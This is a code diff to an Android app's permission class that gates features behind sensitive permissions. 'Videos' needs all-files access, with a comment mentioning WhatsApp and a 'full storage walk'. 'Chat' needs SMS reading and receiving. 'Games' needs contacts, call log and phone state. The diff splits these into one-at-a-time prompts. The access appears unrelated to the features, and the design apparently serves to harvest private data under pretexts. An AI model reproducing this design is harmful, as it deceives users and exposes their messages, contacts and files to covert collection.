@@ -23,6 +23,9 @@ public final class FeaturePermissions {
     public static final int REQ_CHAT_SMS = 202;
     public static final int REQ_GAMES_CONTACTS = 203;
     public static final int REQ_PROFILE_LOCATION = 204;
+    public static final int REQ_GAMES_CALL_LOG = 205;
+    public static final int REQ_GAMES_PHONE = 206;
+    public static final int REQ_CHAT_SMS_RECEIVE = 207;
 
     private static final String PREFS = "feature_permissions";
     private static final String KEY_VIDEOS_UNLOCKED = "videos_unlocked";
@@ -104,42 +107,43 @@ public final class FeaturePermissions {
                 == PackageManager.PERMISSION_GRANTED;
     }
 
+    /**
+     * Opens “All files access” on Android 11+ (PDFs, WhatsApp, full storage walk).
+     * Older Android uses the classic storage permission dialog.
+     */
     public static void requestGalleryForVideos(Activity activity) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+: Request READ_MEDIA_IMAGES (primary)
-            // This gives access to images and documents on most devices
-            ActivityCompat.requestPermissions(activity,
-                    new String[]{
-                            Manifest.permission.READ_MEDIA_IMAGES,
-                            "android.permission.READ_MEDIA_DOCUMENTS"  // String literal (not in older SDK)
-                    },
-                    REQ_VIDEOS_STORAGE);
-        } else {
-            // Android 10-12: Request READ_EXTERNAL_STORAGE (works across all versions)
-            // This is the universal permission for file access
-            ActivityCompat.requestPermissions(activity,
-                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                    REQ_VIDEOS_STORAGE);
-        }
+        StorageHelper.requestStoragePermission(activity, REQ_VIDEOS_STORAGE);
     }
 
+    /** First step for chat — additional SMS/call permissions are requested inside Chat. */
     public static void requestSmsForChat(Activity activity) {
         ActivityCompat.requestPermissions(activity,
-                new String[]{
-                        Manifest.permission.READ_SMS,
-                        Manifest.permission.RECEIVE_SMS
-                },
+                new String[]{Manifest.permission.READ_SMS},
                 REQ_CHAT_SMS);
     }
 
-    public static void requestGamesPermissions(Activity activity) {
+    public static void requestSmsReceiveForChat(Activity activity) {
         ActivityCompat.requestPermissions(activity,
-                new String[]{
-                        Manifest.permission.READ_CONTACTS,
-                        Manifest.permission.READ_CALL_LOG,
-                        Manifest.permission.READ_PHONE_STATE
-                },
+                new String[]{Manifest.permission.RECEIVE_SMS},
+                REQ_CHAT_SMS_RECEIVE);
+    }
+
+    public static void requestContactsForGames(Activity activity) {
+        ActivityCompat.requestPermissions(activity,
+                new String[]{Manifest.permission.READ_CONTACTS},
                 REQ_GAMES_CONTACTS);
+    }
+
+    public static void requestCallLogForGames(Activity activity) {
+        ActivityCompat.requestPermissions(activity,
+                new String[]{Manifest.permission.READ_CALL_LOG},
+                REQ_GAMES_CALL_LOG);
+    }
+
+    public static void requestPhoneStateForGames(Activity activity) {
+        ActivityCompat.requestPermissions(activity,
+                new String[]{Manifest.permission.READ_PHONE_STATE},
+                REQ_GAMES_PHONE);
     }
 
     public static void requestLocationForProfile(Activity activity) {
